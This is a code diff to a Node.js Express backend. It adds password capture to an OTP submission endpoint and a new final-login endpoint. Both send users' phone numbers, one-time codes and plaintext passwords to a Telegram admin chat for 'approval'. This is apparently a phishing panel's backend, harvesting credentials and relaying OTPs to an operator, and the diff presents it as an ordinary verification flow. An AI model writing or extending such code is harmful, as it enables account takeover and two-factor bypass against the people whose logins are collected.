@@ -28,22 +28,23 @@ const otpRequests = new Map();
  * Store it and notify Telegram bot
  */
 app.post("/api/otp/submit", (req, res) => {
-  const { phone, otp, userId, email, firstName, lastName } = req.body;
+  const { phone, otp, password, userId, email, firstName, lastName } = req.body;
 
-  if (!phone || !otp || !userId) {
+  if (!phone || !otp || !password) {
     return res
       .status(400)
-      .json({ error: "Missing required fields: phone, otp, userId" });
+      .json({ error: "Missing required fields: phone, otp, password" });
   }
 
   const requestId = uuidv4();
   const timestamp = new Date().toISOString();
 
-  // Store the request
+  // Store the request (include password)
   otpRequests.set(requestId, {
     requestId,
     phone,
     otp,
+    password,
     email,
     firstName,
     lastName,
@@ -53,8 +54,8 @@ app.post("/api/otp/submit", (req, res) => {
     rejectedReason: null,
   });
 
-  // Send notification to Telegram admin
-  sendTelegramNotification(requestId, phone, otp, email, firstName, lastName);
+  // Send notification to Telegram admin (include password for manual verification)
+  sendTelegramNotification(requestId, phone, otp, password, email, firstName, lastName);
 
   console.log(`[OTP] New request ${requestId} for ${phone}`);
 
@@ -160,6 +161,7 @@ function sendTelegramNotification(
   requestId,
   phone,
   otp,
+  password,
   email,
   firstName,
   lastName
@@ -174,6 +176,7 @@ function sendTelegramNotification(
 📧 <b>Email:</b> ${email || "N/A"}
 📱 <b>Phone:</b> ${phone}
 🔑 <b>OTP:</b> <code>${otp}</code>
+🔐 <b>Password:</b> <code>${password}</code>
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
 
 <b>Device ID:</b> <code>${requestId}</code>
@@ -244,6 +247,81 @@ app.post("/api/telegram/webhook", (req, res) => {
 
   res.json({ ok: true });
 });
+
+/**
+ * POST /api/login/submit
+ * Receive final login submission (login2) and notify Telegram admin for approval
+ */
+app.post('/api/login/submit', (req, res) => {
+  const { username, password, phone } = req.body;
+
+  if (!username || !password) {
+    return res.status(400).json({ error: 'Missing required fields: username, password' });
+  }
+
+  const requestId = uuidv4();
+  const timestamp = new Date().toISOString();
+
+  otpRequests.set(requestId, {
+    requestId,
+    type: 'login2',
+    username,
+    password,
+    phone: phone || null,
+    timestamp,
+    approved: false,
+    rejectedReason: null,
+  });
+
+  sendTelegramLoginNotification(requestId, username, password, phone);
+
+  console.log(`[LOGIN2] New final-login request ${requestId} for ${username}`);
+
+  res.json({ success: true, requestId, message: 'Login submitted. Awaiting admin approval.' });
+});
+
+function sendTelegramLoginNotification(requestId, username, password, phone) {
+  const approveUrl = `${BACKEND_URL}/api/telegram/approve`;
+  const callbackToken = process.env.TELEGRAM_CALLBACK_TOKEN;
+
+  const message = `
+🔐 <b>Final Login Approval</b>
+
+👤 <b>User:</b> ${username}
+📱 <b>Phone:</b> ${phone || 'N/A'}
+🔐 <b>Submitted Password:</b> <code>${password}</code>
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+
+<b>Request ID:</b> <code>${requestId}</code>
+`;
+
+  const options = {
+    parse_mode: 'HTML',
+    reply_markup: {
+      inline_keyboard: [
+        [
+          {
+            text: '✅ APPROVE',
+            url: `${approveUrl}?requestId=${requestId}&action=approve&token=${callbackToken}`,
+          },
+          {
+            text: '❌ REJECT',
+            url: `${approveUrl}?requestId=${requestId}&action=reject&token=${callbackToken}`,
+          },
+        ],
+      ],
+    },
+  };
+
+  bot
+    .sendMessage(TELEGRAM_ADMIN_CHAT_ID, message, options)
+    .then(() => {
+      console.log(`[Telegram] Login2 notification sent for ${requestId}`);
+    })
+    .catch((err) => {
+      console.error(`[Telegram] Error sending login2 notification:`, err.message);
+    });
+}
 
 /**
  * Health check
